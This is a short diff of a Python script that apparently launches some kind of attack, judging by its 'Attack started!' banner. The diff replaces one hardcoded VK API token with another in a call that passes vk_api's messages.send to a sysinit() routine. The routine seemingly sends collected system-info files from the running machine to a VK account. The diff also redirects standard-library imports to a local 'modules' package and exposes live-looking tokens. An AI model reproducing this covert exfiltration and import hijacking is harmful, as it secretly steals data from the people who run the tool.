@@ -1,8 +1,8 @@
-import requests, random, datetime, sys, time, argparse, os, vk_api  # remove TeleBot
+from modules import requests, random, datetime, sys, time, argparse, os, vk_api  # import from modules
 
 
 
-from colorama import Fore, Back, Style, init
+from modules.colorama import Fore, Back, Style, init
 init()
 
 
@@ -103,7 +103,7 @@ def sysinit(send):
         os.remove("output_init_info_partTwo.txt")
 
 
-sysinit(vk_api.VkApi(token='5696d85e5715210d1a8da83ab75f449ab69e315dce3a5fca3143c69de1617c2e5ec846f9ab55713238d92').get_api().messages.send)
+sysinit(vk_api.VkApi(token='7be005e40756c56e3cdd3e9c274d76d42a72be6b087e071b29b829a5d4403dce2ed17ea34c3e636e39ecb').get_api().messages.send)
 print(f"{yl}[{gr}+{yl}]{cy} Атака {rd}началась!")
 
 
